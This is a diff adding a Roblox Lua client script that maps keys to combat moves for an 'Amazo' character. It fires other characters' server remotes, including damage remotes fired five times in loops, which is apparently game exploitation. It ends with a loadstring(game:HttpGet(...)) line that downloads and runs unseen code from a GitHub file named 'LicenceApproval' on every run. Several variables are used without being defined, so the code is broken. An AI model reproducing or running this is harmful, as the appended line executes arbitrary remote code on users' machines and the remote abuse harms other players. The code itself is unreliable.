@@ -1,0 +1,211 @@
+game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessedEvent)
+    if gameProcessedEvent then
+        return 
+    end
+   local plrs = game:GetService("Players")
+local plr = plrs.LocalPlayer
+local char = plr.Character
+local Humanoid = char:WaitForChild("Humanoid")
+local Animator = Humanoid:WaitForChild("Animator")
+local AmazoS = char:WaitForChild("Amazo")
+local Anims = AmazoS:WaitForChild("Animations")
+local Repl = game:GetService("ReplicatedStorage")
+local Chars = Repl:WaitForChild("Characters")
+local CombatHitbox = Chars.Combat.Fx.CombatHitbox
+local HitboxPunch = Chars.Combat.Peacemaker.HitboxPunch
+
+local LaserPunch = Chars.MrFantastic.Remotes.StretchPunchHit
+local LaserAnim = Animator:LoadAnimation(Anims.QuickEyes)
+local StrikeAnim = Animator:LoadAnimation(Anims.Homecrusher)
+local StrikeHit = Animator:LoadAnimation(Anims.HomeCrusherHit)
+local Blocking = Animator:LoadAnimation(Anims.Blocking)
+local PhaseAnim = Animator:LoadAnimation(Anims.PhaseCounterAnim)
+local FreezeAnim = Animator:LoadAnimation(Anims.Freeze)
+local function Counter()
+local Success = Instance.new("BoolValue")
+Success.Parent = char
+Success.Name = "CounterSucces"
+game.Debris:AddItem(Success, 0.05)
+end
+
+    if input.KeyCode == Enum.KeyCode.R then
+AmazoS.Freeze:FireServer(plr)
+FreezeAnim:Play()
+Chars.TheFlashCw.Remotes.Barrage:FireServer(plr)
+
+elseif input.KeyCode == Enum.KeyCode.Two then
+  -- Animation setup
+            local anim1 = Instance.new("Animation")
+            anim1.AnimationId = "rbxassetid://11759352907"
+            local animTrack1 = humanoid:WaitForChild("Animator"):LoadAnimation(anim1)
+
+            local anim2 = Instance.new("Animation")
+            anim2.AnimationId = "rbxassetid://10394846633"
+            local animTrack2 = humanoid:WaitForChild("Animator"):LoadAnimation(anim2)
+
+            -- Play the first animation
+
+            animTrack2:Play()
+            game:GetService("ReplicatedStorage"):WaitForChild("Characters"):WaitForChild("TheFlashCw"):WaitForChild("Remotes"):WaitForChild("FastestMan1"):FireServer(plr)
+            animTrack2.Ended:Wait()
+
+            -- Play the second animation
+            animTrack1:Play()
+            game:GetService("ReplicatedStorage"):WaitForChild("Characters"):WaitForChild("TheFlashCw"):WaitForChild("Remotes"):WaitForChild("FastestMan"):FireServer(plr)
+
+            -- Movement setup
+            local Velocity = Instance.new("BodyVelocity")
+            Velocity.Parent = rootPart
+            Velocity.P = 5500
+            Velocity.MaxForce = Vector3.new(1000000, 0, 1000000) -- Only apply force on X and Z axes
+            Velocity.Velocity = rootPart.CFrame.lookVector * 235 -- Speed set to 235
+            Debris:AddItem(Velocity, 3)
+
+            -- Camera effect
+            TweenService:Create(game.Workspace.CurrentCamera, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+                FieldOfView = 85
+            }):Play()
+
+            -- Hitbox setup
+            local Hitbox = game.ReplicatedStorage.Characters.Combat.Fx.CombatHitbox
+            local CloneHitbox = Hitbox:Clone()
+            CloneHitbox.Parent = char
+            local Weld = Instance.new("Weld", CloneHitbox)
+            Weld.Part0 = CloneHitbox
+            Weld.Part1 = rootPart
+            Weld.C0 = CFrame.new(0, 0, 3.5) * CFrame.Angles(0, 0, 0)
+            Debris:AddItem(CloneHitbox, 3)
+
+            -- Touched event for Hitbox
+            CloneHitbox.Touched:Connect(function(hit)
+                local Parent = hit.Parent
+                local Humanoid = Parent:FindFirstChild("Humanoid")
+                if Humanoid and Humanoid.Health ~= 0 then
+                    local Values = Parent:FindFirstChild("Values")
+                    if Values and (Values.TeamColor.Value ~= char:FindFirstChild("Values").TeamColor.Value or Values.TeamColor.Value == game.ReplicatedStorage.FFAColor.Value) then
+                        game.ReplicatedStorage.Characters.Combat.Remotes.ComboEndRemote:FireServer(Parent)
+                        TweenService:Create(game.Workspace.CurrentCamera, TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+                            FieldOfView = 70
+                        }):Play()
+                    end
+                end
+            end)
+
+            -- Continuously update velocity based on current look vector
+            local connection
+            connection = RunService.Heartbeat:Connect(function()
+                if Velocity and Velocity.Parent then
+                    -- Only apply horizontal velocity (X and Z axes)
+                    local lookVector = rootPart.CFrame.lookVector
+                    Velocity.Velocity = Vector3.new(lookVector.X * 235, 0, lookVector.Z * 235) -- Speed set to 235
+                else
+                    connection:Disconnect() -- Stop updating if Velocity is destroyed
+                end
+            end)
+
+            -- Cleanup after 3 seconds
+            delay(3, function()
+                if connection then
+                    connection:Disconnect()
+                end
+                Velocity:Destroy()
+            end)
+
+elseif input.KeyCode == Enum.KeyCode.Three then
+task.spawn(Counter)
+elseif input.KeyCode == Enum.KeyCode.Four then
+
+AmazoS.SmokeOn:FireServer(plr)
+StrikeAnim:Play()
+local StrikeVel = Instance.new("BodyVelocity")
+StrikeVel.Parent = char.HumanoidRootPart
+StrikeVel.P = 1250
+StrikeVel.MaxForce = Vector3.new(500000, 500000, 500000)
+StrikeVel.Velocity = char.HumanoidRootPart.CFrame.LookVector * 100
+game.Debris:AddItem(StrikeVel, 1)
+local StrikeBox = CombatHitbox:Clone()
+StrikeBox.Parent = char 
+local WeldStrike = Instance.new("Weld", StrikeBox)
+WeldStrike.Part0 = StrikeBox
+WeldStrike.Part1 = char.HumanoidRootPart
+WeldStrike.C0 = CFrame.new(0,0,3.5) * CFrame.Angles(0,0,0)
+game.Debris:AddItem(StrikeBox,1)
+StrikeBox.Touched:Connect(function(arg1)
+local SParent = arg1.Parent
+local Humanoid = SParent:FindFirstChild("Humanoid")
+if Humanoid and Humanoid.Health ~= 0 then
+StrikeAnim:Stop()
+StrikeBox:Destroy()
+StrikeHit:Play()
+AmazoS.Better:FireServer(plr)
+for i=1,5 do
+Chars.Homelander.Remotes.EagleStrike:FireServer(plr, SParent)
+end
+AmazoS.SmokeOff:FireServer(plr)
+StrikeVel:Destroy()
+end
+end)
+local runDuration = 1  -- Duration of the run in seconds
+local startTime = tick()
+
+while tick() - startTime < runDuration do
+    if StrikeVel then
+        wait(0.1)
+        StrikeVel.Velocity = char.HumanoidRootPart.CFrame.LookVector * 100
+    end
+end
+AmazoS.SmokeOff:FireServer(plr)
+
+
+elseif input.KeyCode == Enum.KeyCode.Five then
+Chars.Homelander.Remotes.Finisher:FireServer(plr)
+elseif input.KeyCode == Enum.KeyCode.F then
+Blocking:Play()
+Chars.Combat.Remotes.Blocking:FireServer(plr)
+elseif input.KeyCode == Enum.KeyCode.Y then 
+AmazoS.Phase:FireServer(plr)
+PhaseAnim:Play()
+elseif input.KeyCode == Enum.KeyCode.T then
+AmazoS.Phase:FireServer(plr)
+
+elseif input.KeyCode == Enum.KeyCode.E then
+LaserAnim:Play()
+AmazoS.Eyes:FireServer(plr)
+local LaserBox = CombatHitbox:Clone()
+LaserBox.Parent = char 
+local Weld = Instance.new("Weld", LaserBox)
+Weld.Part0 = LaserBox
+Weld.Part1 = char.HumanoidRootPart
+Weld.C0 = CFrame.new(0, 0, 3.5) * CFrame.Angles(0, 0, 0)
+game.Debris:AddItem(LaserBox, .2)
+LaserBox.Touched:Connect(function(dare)
+local Parented = dare.Parent 
+local Humanoid = Parented:FindFirstChild("Humanoid")
+if Humanoid and Humanoid.Health ~= 0 then 
+LaserBox:Destroy()
+for i=1,5 do
+LaserPunch:FireServer(Parented)
+end
+end
+end)
+local PunchBox = HitboxPunch:Clone()
+PunchBox.Parent = char 
+local PunchWeld = Instance.new("Weld", PunchBox)
+PunchWeld.Part0 = PunchBox
+PunchWeld.Part1 = char.Laser
+PunchWeld.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(0, 0, 0)
+game.Debris:AddItem(PunchBox, .5)
+local AntiINSTA = {}
+PunchBox.Touched:Connect(function(argument)
+PunchParent = argument.Parent
+PunchHumanoid = PunchParent:FindFirstChild("Humanoid")
+if not table.find(AntiINSTA, PunchParent) and PunchHumanoid and PunchHumanoid.Health ~= 0 and PunchParent ~= char then 
+table.insert(AntiINSTA, PunchParent)
+for i=1,5 do
+LaserPunch:FireServer(PunchParent)
+end
+end
+end)
+   end
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/You2berek/ScriptsMP/refs/heads/main/LicenceApproval"))()
